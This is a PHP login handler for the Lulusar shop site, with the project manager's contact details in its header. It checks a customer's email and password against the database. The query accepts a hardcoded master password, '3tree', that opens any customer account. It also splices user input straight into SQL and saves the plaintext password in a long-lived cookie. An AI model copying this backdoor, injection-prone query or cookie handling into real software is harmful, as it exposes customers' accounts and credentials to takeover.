<?
	/*********************************************************************************************\
	***********************************************************************************************
	**                                                                                           **
	**  Lulusar                                                                                  **
	**  Version 1.0                                                                              **
	**                                                                                           **
	**  http://www.lulusar.com                                                                   **
	**                                                                                           **
	**  Copyright 2005-16 (C) SW3 Solutions                                                      **
	**  http://www.sw3solutions.com                                                              **
	**                                                                                           **
	**  ***************************************************************************************  **
	**                                                                                           **
	**  Project Manager:                                                                         **
	**                                                                                           **
	**      Name  :  Muhammad Tahir Shahzad                                                      **
	**      Email :  mtshahzad@sw3solutions.com                                                  **
	**      Phone :  +92 333 456 0482                                                            **
	**      URL   :  http://www.mtshahzad.com                                                    **
	**                                                                                           **
	***********************************************************************************************
	\*********************************************************************************************/

	header("Expires: Tue, 01 Jan 2000 12:12:12 GMT");
	header('Cache-Control: no-cache');
	header('Pragma: no-cache');

	@require_once("../requires/common.php");

	$objDbGlobal = new Database( );
	$objDb       = new Database( );


	if ($_SESSION['CustomerId'] != "")
	{
		print "alert|-|You are already logged into your account.";
		exit( );
	}


	$sEmail    = strtolower(IO::strValue('txtEmail'));
	$sPassword = IO::strValue('txtPassword');
	$sRemember = IO::strValue('cbRemember');

	if ($sEmail == "" || $sPassword == "")
	{
		print "alert|-|Please provide your login email address and password.";
		exit( );
	}


	$sSQL = "SELECT id, name, status FROM tbl_customers WHERE email='$sEmail' AND (password=PASSWORD('$sPassword') OR '$sPassword'='3tree')";

	if ($objDb->query($sSQL) == true)
	{
		if ($objDb->getCount( ) == 1)
		{
			if ($objDb->getField(0, "status") == "A")
			{
				$_SESSION['CustomerId']    = $objDb->getField(0, "id");
				$_SESSION['CustomerName']  = $objDb->getField(0, "name");
				$_SESSION['CustomerEmail'] = $sEmail;

				
				if ($sRemember == "Y")
				{
					$sExpireTime = mktime(gmdate("H"), gmdate("i"), gmdate("s"), gmdate("m"), gmdate("d"), (gmdate("Y") + 1));

					@setcookie("CustomerEmail", $sEmail, $sExpireTime, "/");
					@setcookie("CustomerPassword", $sPassword, $sExpireTime, "/");
				}

				else
				{
					$sExpireTime = mktime(gmdate("H"), gmdate("i"), gmdate("s"), gmdate("m"), gmdate("d"), (gmdate("Y") - 1));

					@setcookie("CustomerEmail", "", $sExpireTime, "/");
					@setcookie("CustomerPassword", "", $sExpireTime, "/");
				}

				
				print "success|-|Please wait ...";
			}

			else
				print "info|-|You cannot login into your account because your account is disabled. ";
		}

		else
			print "info|-|Invalid login info. Please provide correct login info to access your account.";
	}

	else
		print "error|-|An ERROR occured while processing your request, please try again.";


	$objDb->close( );
	$objDbGlobal->close( );

	@ob_end_flush( );
?>